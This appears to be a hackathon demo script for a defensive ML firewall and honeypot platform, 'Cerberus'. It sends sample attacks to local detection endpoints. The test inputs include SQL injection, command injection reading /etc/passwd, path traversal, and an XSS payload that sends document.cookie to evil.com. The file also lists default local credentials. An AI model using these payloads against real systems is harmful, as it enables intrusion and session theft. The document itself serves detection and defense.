# üéØ Cerberus Complete Demo Script for Judges

This script demonstrates all key features of the Cerberus Deceptive Defense Platform.

## üìã Pre-Demo Checklist

```bash
# 1. Start all services
cd /Users/mishragaurav/Documents/Cerberus
docker compose up -d

# 2. Verify all services are healthy
for service in gatekeeper:8000 switch:8001 labyrinth:8002 sentinel:8003; do
  echo "‚úì $service: $(curl -s http://localhost:${service#*:}/health | python3 -c 'import sys, json; print(json.load(sys.stdin).get("status", "unknown"))')"
done

# 3. Check Prometheus (http://localhost:9090)
curl -s http://localhost:9090/-/healthy

# 4. Check Grafana (http://localhost:3001) - admin/admin
# 5. Check MinIO Console (http://localhost:9001) - cerberus/cerberus_minio_password
```

---

## ü§ñ DEMO 1: AI-Powered Threat Detection (Gatekeeper ML Models)

### 1.1 Show ML Model Info
```bash
echo "=== ML Model Information ==="
curl -s http://localhost:8000/api/v1/gatekeeper/ml-model | python3 -m json.tool
```

**What to point out to judges:**
- Isolation Forest with 100 estimators
- 102 extracted features across 6 categories
- POI threshold at 0.75
- LSTM behavioral classifier for session analysis

### 1.2 Normal Request Analysis
```bash
echo "=== Normal Request - Should ALLOW ==="
curl -s -X POST http://localhost:8000/api/v1/gatekeeper/analyze-features \
  -H "Content-Type: application/json" \
  -d '{
    "method": "GET",
    "url": "http://example.com/api/users",
    "headers": {"User-Agent": "Mozilla/5.0"},
    "body": "",
    "query_params": {},
    "client_ip": "192.168.1.100",
    "session_id": "demo-session-1"
  }' | python3 -m json.tool
```

**What to point out:**
- ML anomaly score is low (< 0.3)
- Action: "allow"
- Feature extraction identifies normal patterns

### 1.3 SQL Injection Attack Analysis
```bash
echo "=== SQL Injection Attack - Should DETECT ==="
curl -s -X POST http://localhost:8000/api/v1/gatekeeper/analyze-features \
  -H "Content-Type: application/json" \
  -d '{
    "method": "GET",
    "url": "http://example.com/api/users?id=1 UNION SELECT * FROM admin",
    "headers": {"User-Agent": "sqlmap/1.0"},
    "body": "",
    "query_params": {"id": "1 UNION SELECT * FROM admin"},
    "client_ip": "192.168.1.100",
    "session_id": "attacker-session-1"
  }' | python3 -m json.tool
```

**What to point out:**
- High sql_keyword_count feature
- ML anomaly score increases (> 0.7)
- ModSecurity score is high (> 80)
- Action: "tag_poi" or "block"
- User-Agent detection (sqlmap scanner)

### 1.4 XSS Attack Analysis
```bash
echo "=== XSS Attack - Should DETECT ==="
curl -s -X POST http://localhost:8000/api/v1/gatekeeper/analyze-features \
  -H "Content-Type: application/json" \
  -d '{
    "method": "POST",
    "url": "http://example.com/comment",
    "headers": {"User-Agent": "Chrome/90"},
    "body": "<script>alert(document.cookie)</script>",
    "query_params": {},
    "client_ip": "192.168.1.100",
    "session_id": "attacker-session-2"
  }' | python3 -m json.tool
```

**What to point out:**
- High xss_pattern_count
- Script tag detection
- Entropy analysis detects suspicious content

### 1.5 Command Injection Analysis
```bash
echo "=== Command Injection - Should DETECT ==="
curl -s -X POST http://localhost:8000/api/v1/gatekeeper/analyze-features \
  -H "Content-Type: application/json" \
  -d '{
    "method": "GET",
    "url": "http://example.com/ping?host=8.8.8.8; cat /etc/passwd",
    "headers": {"User-Agent": "curl/7.68.0"},
    "body": "",
    "query_params": {"host": "8.8.8.8; cat /etc/passwd"},
    "client_ip": "192.168.1.100",
    "session_id": "attacker-session-3"
  }' | python3 -m json.tool
```

**What to point out:**
- High command_pattern_count
- Semicolon detection
- Suspicious user agent (curl)

---

## üé≠ DEMO 2: Deceptive Honeypot (Labyrinth)

### 2.1 Access Fake API
```bash
echo "=== Labyrinth Fake Users API ==="
curl -s http://localhost:8002/api/v1/users?limit=3 | python3 -m json.tool
```

**What to point out:**
- Realistic fake data (names, emails, roles)
- Appears as legitimate internal portal
- All data is synthetic (generated by Faker)

### 2.2 Access Fake Documents
```bash
echo "=== Fake Documents ==="
curl -s http://localhost:8002/api/v1/documents | python3 -m json.tool
```

### 2.3 Attempt to Access Fake Config (Honeypot Trigger)
```bash
echo "=== Honeypot - Fake Config Exposure ==="
curl -s http://localhost:8002/admin/config | python3 -m json.tool
```

**What to point out:**
- Fake credentials exposed deliberately
- Attracts attackers
- Captures attacker behavior

### 2.4 Attempt to Access .env File (Path Traversal Simulation)
```bash
echo "=== Honeypot - Fake .env File ==="
curl -s http://localhost:8002/.env
```

**What to point out:**
- Fake environment variables
- Honeytokens embedded
- Captures reconnaissance attempts

---

## üî¨ DEMO 3: Threat Intelligence (Sentinel AI)

### 3.1 Check Sentinel Health
```bash
echo "=== Sentinel Health ==="
curl -s http://localhost:8003/health | python3 -m json.tool
```

### 3.2 Simulate SQL Injection Payload
```bash
echo "=== Payload Simulation ==="
curl -s -X POST http://localhost:8003/api/v1/sentinel/simulate \
  -H "Content-Type: application/json" \
  -H "X-API-Key: sentinel-dev-key-change-me" \
  -d '{
    "payload": {
      "type": "sql_injection",
      "value": "1 OR 1=1",
      "confidence": 0.9
    },
    "shadow_app_ref": "main",
    "metadata": {
      "session_id": "demo-simulation-1"
    }
  }' | python3 -m json.tool
```

**What to point out:**
- Job queued for async execution
- Runs in isolated Docker sandbox
- Returns job_id for tracking

### 3.3 Check Simulation Result
```bash
# Wait 5 seconds for simulation to complete
sleep 5

echo "=== Simulation Results ==="
JOB_ID=$(curl -s -X POST http://localhost:8003/api/v1/sentinel/simulate \
  -H "Content-Type: application/json" \
  -H "X-API-Key: sentinel-dev-key-change-me" \
  -d '{"payload":{"type":"sql_injection","value":"1 OR 1=1","confidence":0.9},"shadow_app_ref":"main","metadata":{}}' | python3 -c 'import sys, json; print(json.load(sys.stdin)["job_id"])')

curl -s "http://localhost:8003/api/v1/sentinel/sim-result/$JOB_ID" | python3 -m json.tool
```

**What to point out:**
- Verdict (exploit_possible, exploit_improbable, etc.)
- Execution time
- Behavioral analysis
- Evidence collection

### 3.4 View Generated Rules
```bash
echo "=== Auto-Generated WAF Rules ==="
curl -s http://localhost:8003/api/v1/sentinel/rules | python3 -m json.tool
```

**What to point out:**
- Rules auto-generated from simulations
- Confidence scores
- MITRE ATT&CK tags
- Ready for deployment to Gatekeeper

### 3.5 List Attacker Profiles
```bash
echo "=== Behavioral Profiles ==="
curl -s http://localhost:8003/api/v1/sentinel/profiles | python3 -m json.tool
```

---

## üéØ DEMO 4: ML Feature Extraction Deep Dive

### 4.1 Show 102 Features Extracted
```bash
echo "=== Full Feature Extraction ==="
curl -s -X POST http://localhost:8000/api/v1/gatekeeper/analyze-features \
  -H "Content-Type: application/json" \
  -d '{
    "method": "POST",
    "url": "http://example.com/api/login?redirect=../../../etc/passwd",
    "headers": {
      "User-Agent": "python-requests/2.25.1",
      "Content-Type": "application/json"
    },
    "body": "{\"username\":\"admin'\''--\",\"password\":\"anything\"}",
    "query_params": {"redirect": "../../../etc/passwd"},
    "client_ip": "192.168.1.100",
    "session_id": "feature-demo"
  }' | python3 -m json.tool
```

**What to point out:**
- Top 10 most significant features
- Pattern detection (SQL, XSS, path traversal)
- Entropy analysis
- Character ratio analysis
- Combined ML + WAF scoring

---

## üìä DEMO 5: Observability & Monitoring

### 5.1 Check Prometheus Metrics
```bash
echo "=== Request Metrics ==="
curl -s 'http://localhost:9090/api/v1/query?query=up' | python3 -m json.tool

echo "=== Service Health ==="
curl -s 'http://localhost:9090/api/v1/query?query=cerberus_service_up' | python3 -m json.tool 2>/dev/null || echo "Metric not yet configured"
```

### 5.2 Open Grafana Dashboard
```bash
echo "=== Grafana Dashboard ==="
echo "Open in browser: http://localhost:3001"
echo "Login: admin / admin"
echo "Navigate to: Cerberus Overview Dashboard"
```

**What to show in Grafana:**
- Request rate graphs
- Threat detection timeline
- ML anomaly scores over time
- Service health status

---

## üîê DEMO 6: End-to-End Attack Flow

### 6.1 Full Attack Scenario
```bash
echo "=== COMPLETE ATTACK SIMULATION ==="

# Session ID for tracking
SESSION="judge-demo-$(date +%s)"

# Step 1: Reconnaissance - Attacker probes for vulnerabilities
echo "\n1Ô∏è‚É£  Reconnaissance Phase..."
curl -s -H "X-Session-Id: $SESSION" \
  "http://localhost:8002/admin/config" > /dev/null

# Step 2: SQL Injection attempt
echo "2Ô∏è‚É£  SQL Injection Attempt..."
curl -s -X POST http://localhost:8000/api/v1/inspect \
  -H "Content-Type: application/json" \
  -d "{
    \"method\": \"GET\",
    \"url\": \"http://example.com/users?id=1' OR '1'='1\",
    \"headers\": {\"User-Agent\": \"sqlmap/1.4\"},
    \"body\": \"\",
    \"query_params\": {\"id\": \"1' OR '1'='1\"},
    \"client_ip\": \"203.0.113.42\",
    \"session_id\": \"$SESSION\"
  }" | python3 -m json.tool

# Step 3: XSS attempt
echo "3Ô∏è‚É£  XSS Attempt..."
curl -s -X POST http://localhost:8000/api/v1/inspect \
  -H "Content-Type: application/json" \
  -d "{
    \"method\": \"POST\",
    \"url\": \"http://example.com/comment\",
    \"headers\": {\"User-Agent\": \"Chrome/90\"},
    \"body\": \"<script>fetch('http://evil.com/steal?cookie='+document.cookie)</script>\",
    \"query_params\": {},
    \"client_ip\": \"203.0.113.42\",
    \"session_id\": \"$SESSION\"
  }" | python3 -m json.tool

# Step 4: Check session analysis
echo "4Ô∏è‚É£  Session Analysis..."
curl -s http://localhost:8000/api/v1/gatekeeper/stats | python3 -m json.tool

echo "\n‚úÖ Attack scenario complete. Session ID: $SESSION"
```

**What to point out:**
- Progressive threat score building
- Session history tracking
- Behavioral anomaly detection
- POI tagging triggers
- Event logging

---

## üß™ DEMO 7: Sentinel ML Training & Model Server

### 7.1 View Dataset Statistics
```bash
echo "=== Dataset Statistics ==="
curl -s http://localhost:8003/api/v1/sentinel/dataset/stats | python3 -m json.tool
```

### 7.2 Add Training Sample
```bash
echo "=== Add Labeled Sample ==="
curl -s -X POST http://localhost:8003/api/v1/sentinel/dataset/add-sample \
  -H "Content-Type: application/json" \
  -d '{
    "sample_type": "payload",
    "data": {
      "type": "sql_injection",
      "value": "1 UNION SELECT NULL",
      "context": {"url": "/api/users", "method": "GET"}
    },
    "label": "malicious",
    "confidence": 0.95,
    "source": "manual_review"
  }' | python3 -m json.tool
```

### 7.3 View Model Registry
```bash
echo "=== Model Registry ==="
curl -s http://localhost:8003/api/v1/sentinel/models | python3 -m json.tool
```

### 7.4 Model Server Health
```bash
echo "=== Model Server Status ==="
curl -s http://localhost:8003/api/v1/sentinel/model-server/health | python3 -m json.tool
```

---

## üì∏ Key Screenshots for Judges

### Must-Show Screenshots:
1. **Grafana Dashboard** - Real-time metrics
2. **ML Feature Analysis** - Showing 102 features extraction
3. **Attack Detection** - Side-by-side normal vs malicious
4. **Sentinel Simulation** - Sandbox execution results
5. **MinIO Console** - Evidence packages stored
6. **Prometheus Targets** - All services UP

---

## üé¨ Presentation Flow for Judges

### 5-Minute Demo Structure:

1. **Intro (30s)**: "Cerberus is an AI-powered deceptive defense platform"
2. **ML Detection (1min)**: Show normal vs attack in Gatekeeper
3. **Honeypot (1min)**: Show Labyrinth fake data attracting attackers
4. **AI Analysis (1.5min)**: Sentinel simulation + rule generation
5. **Monitoring (1min)**: Grafana dashboard + Prometheus metrics
6. **Recap (30s)**: "ML + Deception + Automation = Cerberus"

### Key Talking Points:
- **102 ML features** extracted per request
- **Isolation Forest** algorithm for anomaly detection
- **Behavioral LSTM** for session analysis
- **Docker sandbox** isolation for simulations
- **Auto-generated WAF rules** from threat intelligence
- **S3-compatible evidence storage** for forensics
- **Prometheus + Grafana** for observability

---

## üöÄ Quick Demo Commands (1-Liner)

```bash
# All-in-one attack demo
curl -s -X POST http://localhost:8000/api/v1/gatekeeper/analyze-features -H "Content-Type: application/json" -d '{"method":"GET","url":"http://example.com/api?id=1 UNION SELECT password FROM users","headers":{"User-Agent":"sqlmap"},"body":"","query_params":{},"client_ip":"1.2.3.4","session_id":"demo"}' | python3 -m json.tool

# Show ML model working
curl -s http://localhost:8000/api/v1/gatekeeper/ml-model | python3 -m json.tool

# Trigger simulation
curl -s -X POST http://localhost:8003/api/v1/sentinel/simulate -H "Content-Type: application/json" -H "X-API-Key: sentinel-dev-key-change-me" -d '{"payload":{"type":"sql_injection","value":"1 OR 1=1","confidence":0.9},"shadow_app_ref":"main","metadata":{}}' | python3 -m json.tool
```

---

## ‚ö° Troubleshooting

```bash
# Restart service if down
docker compose restart gatekeeper

# View logs
docker compose logs -f gatekeeper

# Rebuild if code changed
docker compose build gatekeeper && docker compose up -d gatekeeper

# Check container status
docker compose ps
```

---

## üìù Post-Demo Cleanup

```bash
# Optional: Stop all services
docker compose down

# Or keep running for Q&A
# Judges can interact with live system
```
